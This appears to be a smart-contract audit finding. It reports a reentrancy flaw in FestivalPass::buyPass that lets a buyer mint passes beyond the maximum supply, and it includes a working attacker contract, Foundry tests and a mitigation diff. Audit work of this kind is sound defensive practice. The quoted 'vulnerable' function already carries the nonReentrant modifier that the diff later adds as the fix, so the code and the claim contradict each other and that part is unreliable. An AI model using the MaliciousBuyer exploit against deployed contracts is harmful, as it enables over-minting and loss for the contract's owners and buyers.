# Reentrancy attack in `FestivalPass::buyPass` allows attendee to buy extra passes to the event

## Description

The `FestivalPass::buyPass` function does not follow CEI and as a result enables a malicous user to buy more passes than allowed in `passMaxSupply[collectionId]`.

```solidity
   function buyPass(uint256 collectionId) external payable nonReentrant {
        require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
        require(msg.value == passPrice[collectionId], "Incorrect payment amount");
        require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
@>      _mint(msg.sender, collectionId, 1, "");
@>      ++passSupply[collectionId]; 
        uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
        if (bonus > 0) {
            BeatToken(beatToken).mint(msg.sender, bonus);
        }
        emit PassPurchased(msg.sender, collectionId); 
    }
```

An attendee who wants extra passes to an **almost** sold out event could have a `onERC1155Received` function that calls the `FestivalPass::buyPass` function again and mint another pass. They could continue to cycle this for as many passes as they want to pay for.

## Risk

**Likelihood:**

This vulnerability has Medium likelihood due economic barrier, but would otherwise be High for these reasons:

1. Only requires attacker to write a custom smart contract
2. Does not require privileged access or insider info
3. ERC1155 standard behavior (mint → onERC1155Received) is well-known, and exploitable if CEI is not followed
4. Easily testable off-chain or on testnet

**Impact:** 
1. Scarcity and Trust Are Broken: Users trust that only passMaxSupply (VIP passes) will exist.  If a hacker mints more, the smart contract breaks its core guarantee.  This damages your reputation and could lead to legal or financial consequences.
2. Monetary Loss: Passes could come with perks or value (e.g. backstage access, NFT rewards).  They might claim extra BEAT bonuses or attend exclusive events without permission.
3. On-chain Imbalances and Accounting Errors: Logic might rely on passSupply staying within passMaxSupply. 
4. Event Spam or Performance Abuse: Over-minted passes let the attacker spam events

## Proof of Concept

1. Attacker writes a contract with `onERC1155Received()` that calls `FestivalPass::buyPass()` again.
2. They call `FestivalPass::buyPass()` once.
3. Because `msg.sender` is a smart contract, OpenZeppelin’s `_mint()` detects this and explicitly calls `IERC1155Receiver(msg.sender).onERC1155Received()`.
4. The attacker's `onERC1155Received()` function then performs a reentrant call to `buyPass()` again, while the previous call has not yet updated storage.
5. That reentrant call passes all `require()` checks (because supply not updated).
6. Another `_mint()` happens.
7. Another call...
8. Repeats until passMaxSupply is bypassed or DoS-style mint spam occurs.

**Proof of Code:**

Add the following contract:

```solidity
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract MaliciousBuyer is IERC1155Receiver {
    FestivalPass public festival;
    uint256 public passId;
    uint256 public buyCount;
    uint256 public passPrice;

    constructor(FestivalPass _festival, uint256 _passId) payable {
        festival = _festival;
        passId = _passId;
    }

    // Callback from _mint
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (buyCount < 1) {
            buyCount++;
            // Use stored price instead of msg.value
            festival.buyPass{value: passPrice}(passId);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }

    function attack(uint256 price) external payable {
        require(msg.value == price, "Wrong ETH sent");
        passPrice = price; // store for reentrant use
        festival.buyPass{value: price}(passId);
    }

    receive() external payable {}
}
```

Add this test which fails, showing the vulnerability:

```solidity
    function test_Reentrancy_BuyPass_OverMints() public {
        uint256 GENERAL_PASS = 1;
        uint256 MAX_SUPPLY = 1;
        vm.prank(organizer);
        festivalPass.configurePass(GENERAL_PASS, GENERAL_PRICE, MAX_SUPPLY);

        MaliciousBuyer attacker = new MaliciousBuyer{value: GENERAL_PRICE}(festivalPass, 1);

        attacker.attack{value: GENERAL_PRICE}(GENERAL_PRICE);

        assertEq(festivalPass.balanceOf(address(attacker), GENERAL_PASS), MAX_SUPPLY, "Attacker was able to mint more than max supply!");
    }
```

## Recommended Mitigation

To fix this, implement one or both of these:

1. Use nonReentrant (OpenZeppelin’s `ReentrancyGuard`): This is the cleanest and safest approach, and solves the problem even if the order stays the same.
2. Reorder to follow CEI: Move the state update before `_mint()`.

```diff
+import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 
-contract FestivalPass is ERC1155, Ownable2Step, IFestivalPass {
+contract FestivalPass is ERC1155, Ownable2Step, IFestivalPass, ReentrancyGuard {
     address public beatToken;
```

```diff
     // Buy a festival pass
-    function buyPass(uint256 collectionId) external payable {
+    function buyPass(uint256 collectionId) external payable nonReentrant {
         // Must be valid pass ID (1 or 2 or 3)
```

Add this test:

```solidity
   function test_Reentrancy_BuyPass_NoMints() public {
        uint256 GENERAL_PASS = 1;
        uint256 MAX_SUPPLY = 1;
        vm.prank(organizer);
        festivalPass.configurePass(GENERAL_PASS, GENERAL_PRICE, MAX_SUPPLY);

        MaliciousBuyer attacker = new MaliciousBuyer{value: GENERAL_PRICE}(festivalPass, 1);

        // Now reentrancy is blocked — full tx reverts
        vm.expectRevert(ReentrancyGuard.ReentrancyGuardReentrantCall.selector);
        attacker.attack{value: GENERAL_PRICE}(GENERAL_PRICE);

        // Because the whole tx reverted, attacker minted 0 tokens
        assertEq(festivalPass.balanceOf(address(attacker), 1), 0, "Attacker unexpectedly received tokens");
   }
```

